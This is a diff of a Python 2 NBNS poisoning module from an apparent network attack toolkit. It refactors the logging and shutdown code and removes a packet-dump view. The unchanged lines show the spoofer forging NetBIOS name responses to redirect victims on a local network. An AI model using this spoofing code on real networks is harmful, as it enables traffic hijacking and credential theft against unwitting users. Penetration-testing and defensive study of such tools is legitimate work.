@@ -17,7 +17,6 @@ class nbns(Poison):
 		self.regex_match = None
 		self.redirect = None
 		self.running = False
-		self.dump = False
 		super(nbns,self).__init__('NBNS Poison')
 
 	def handler(self,pkt):
@@ -36,7 +35,7 @@ class nbns(Poison):
 				response /= NBNSQueryResponse(NAME_TRN_ID=trans_id, RR_NAME=request, NB_ADDRESS=self.redirect)
 				del response[UDP].chksum # recalc checksum
 				sendp(response)	# layer 2 send for performance
-				if self.dump: util.Msg('Spoofing \'%s\' from %s'%(request.strip(), pkt[IP].src))
+				self.log_msg('Spoofing \'%s\' from %s'%(request.strip(),pkt[IP].src))
 
 	def initialize(self):
 		"""Initialize spoofer"""
@@ -53,9 +52,7 @@ class nbns(Poison):
 				break
 			except KeyboardInterrupt:
 				return False
-			except Exception, e:
-				print e
-				pass
+			except Exception: pass
 
 		print '[!] Starting NBNS spoofer...' 
 		sniffr = Thread(target=self.sniff_thread)
@@ -65,26 +62,8 @@ class nbns(Poison):
 
 	def sniff_thread(self):
 		"""Sniff packets"""
-		sniff(filter='udp and port 137', prn=self.handler, store=0, stopper=self.stop_call,
+		sniff(filter='udp and port 137', prn=self.handler, store=0, stopper=self.test_stop,
 												stopperTimeout=3)
-
-	def stop_call(self):
-		"""Stop callback"""
-		if self.running:
-			return False
-		util.debug('nbns spoofer shutdown')
-		return True
-
-	def view(self):
-		"""Dump packets"""
-		try:
-			util.Msg('Dumping NBNS poisons...')
-			self.dump = True
-			raw_input()
-			self.dump = False
-		except KeyboardInterrupt:
-			self.dump = False
-			return
 
 	def shutdown(self):
 		"""Shutdown sniffer"""
